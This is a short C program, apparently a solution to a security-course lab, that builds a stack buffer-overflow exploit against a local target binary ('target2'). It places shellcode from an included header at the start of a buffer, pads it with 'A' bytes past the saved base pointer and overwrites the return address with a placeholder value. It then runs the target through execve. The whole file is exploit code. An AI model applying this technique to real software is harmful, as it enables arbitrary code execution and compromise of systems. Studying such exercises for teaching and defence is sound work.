#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int main(int argc, char *argv[]) {
    char *args[3];
    char *env[1];
    char exploit[300]; // buffer to hold exploit string

    int shellcode_len = sizeof(shellcode);
    int padding_size = 256 - shellcode_len + 8; // +8 for the saved base pointer
    unsigned long shell_addr = 0xdeadbeefdeadbeef; // this is a placeholder!

    // copy the shellcode to the start of the exploit string
    memcpy(exploit, shellcode, shellcode_len);

    // add padding
    memset(exploit + shellcode_len, 'A', padding_size);

    // overwrite the return address
    for (int i = 0; i < 8; i++) {
        exploit[shellcode_len + padding_size + i] = (shell_addr >> (i * 8)) & 0xFF;
    }

    args[0] = TARGET;
    args[1] = exploit;
    args[2] = NULL;

    env[0] = NULL;

    if (execve(TARGET, args, env) < 0)
        fprintf(stderr, "execve failed.\n");

    return (0);
}
